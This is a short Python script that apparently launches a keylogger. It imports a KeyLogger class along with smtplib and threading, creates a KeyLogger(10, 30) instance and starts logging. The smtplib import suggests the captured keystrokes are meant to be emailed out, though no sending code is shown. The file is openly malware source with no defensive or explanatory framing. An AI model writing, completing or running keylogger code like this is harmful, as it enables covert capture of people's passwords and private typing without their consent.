#!./virtualenv/bin/python
from KeyLogger import KeyLogger
import smtplib
import threading


kl = KeyLogger(10, 30)
kl.startLogging()